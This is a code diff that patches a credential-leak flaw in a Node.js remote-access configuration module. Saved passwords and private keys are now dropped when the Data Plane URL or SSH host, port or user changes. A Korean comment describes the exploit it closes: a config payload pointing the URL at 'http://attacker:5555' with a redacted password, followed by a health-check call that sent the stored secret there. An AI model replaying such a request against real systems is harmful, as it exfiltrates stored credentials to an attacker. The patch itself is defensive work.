@@ -13,6 +13,7 @@ import crypto from 'node:crypto';
 import { config } from '../config.js';
 import { atomicWriteFileSync, preserveCorrupt } from '../util/atomicWrite.js';
 import { openSecretsDeep, sealSecretsDeep } from '../security/secretVault.js'; // 자격증명 저장 방식(평문/암호화, v2.296) — 로드 시 복호·저장 시 봉인
+import { accessMoved, dropCarriedSecrets } from '../util/secretCarry.js';
 
 const FILE = path.join(config.configDir, 'remote-access.json');
 
@@ -84,18 +85,32 @@ export function getConfigSafe() {
   };
 }
 
+/**
+ * ⚠ 보안(v2.500 감사 H2): 저장 경로도 "접속처가 바뀌면 저장 비밀을 승계하지 않는다" 규칙을 지킨다.
+ * v2.488(H-2)은 `/remote/test`·`/deploy/test` 만 고쳤는데, `PUT /api/remote/config` 로
+ * `{dataplane:{url:'http://attacker:5555', password:'********'}}` 를 저장한 뒤
+ * `POST /remote/proxies/:id/health` 를 부르면 저장된 Data Plane 비밀번호가 Basic 으로 그 URL 에
+ * 전송됐고, deploy 쪽은 저장된 root 비번·개인키로 공격자 sshd 에 접속했다. 규칙: util/secretCarry.js.
+ */
+const DP_ID_KEYS = ['url'];                          // Data Plane 은 URL 이 곧 접속처
+const DEPLOY_ID_KEYS = ['host', 'port', 'username']; // SSH 배포는 호스트·포트·계정
+
 export function saveConfig(partial = {}) {
   const c = load();
   if (partial.dataplane) {
     const dp = partial.dataplane;
+    const moved = accessMoved(c.dataplane, dp, DP_ID_KEYS);
     if (dp.password === REDACT) delete dp.password; // keep existing when redacted placeholder sent
     c.dataplane = { ...c.dataplane, ...dp };
+    if (moved) dropCarriedSecrets(c.dataplane, dp, ['password']);
   }
   if (partial.deploy) {
     const dep = { ...partial.deploy };
+    const moved = accessMoved(c.deploy, dep, DEPLOY_ID_KEYS);
     if (dep.password === REDACT) delete dep.password;
     if (dep.privateKey === REDACT) delete dep.privateKey;
     c.deploy = { ...c.deploy, ...dep };
+    if (moved) dropCarriedSecrets(c.deploy, dep, ['password', 'privateKey']);
   }
   if (partial.guacd) c.guacd = { ...c.guacd, ...partial.guacd };
   for (const k of ['proxyHost', 'publicPortBase']) if (partial[k] !== undefined) c[k] = partial[k];
@@ -145,9 +160,16 @@ const redactProxy = (p) => ({
 
 export function listProxiesSafe() { return load().proxies.map(normalizeProxy).map(redactProxy); }
 
-function mergeSecrets(target, incoming, keys) {
+/**
+ * 비밀 병합 — REDACT 는 '기존 유지'. 단 `idKeys`(접속처)가 바뀌면 승계하지 않는다(v2.500 H2).
+ * idKeys 를 넘기지 않는 호출을 새로 만들지 말 것 — 그게 이 결함의 원래 모양이다.
+ */
+function mergeSecrets(target, incoming, keys, idKeys = []) {
+  const moved = idKeys.length ? accessMoved(target, incoming, idKeys) : false;
   for (const k of keys) if (incoming[k] === REDACT) delete incoming[k];
-  return { ...target, ...incoming };
+  const out = { ...target, ...incoming };
+  if (moved) dropCarriedSecrets(out, incoming, keys);
+  return out;
 }
 
 export function saveProxy(body = {}) {
@@ -157,8 +179,8 @@ export function saveProxy(body = {}) {
   const base = existing || normalizeProxy({ id: crypto.randomBytes(4).toString('hex') });
   const next = { ...base };
   for (const k of ['name', 'proxyHost', 'publicPortBase', 'vcenterIds']) if (body[k] !== undefined) next[k] = body[k];
-  if (body.dataplane) next.dataplane = mergeSecrets(base.dataplane || DEFAULTS.dataplane, { ...body.dataplane }, ['password']);
-  if (body.deploy) next.deploy = mergeSecrets(base.deploy || DEFAULTS.deploy, { ...body.deploy }, ['password', 'privateKey']);
+  if (body.dataplane) next.dataplane = mergeSecrets(base.dataplane || DEFAULTS.dataplane, { ...body.dataplane }, ['password'], DP_ID_KEYS);
+  if (body.deploy) next.deploy = mergeSecrets(base.deploy || DEFAULTS.deploy, { ...body.deploy }, ['password', 'privateKey'], DEPLOY_ID_KEYS);
   if (body.guacd) next.guacd = { ...(base.guacd || DEFAULTS.guacd), ...body.guacd };
   if (existing) c.proxies = c.proxies.map((p) => (p.id === existing.id ? next : p));
   else c.proxies.push(next);
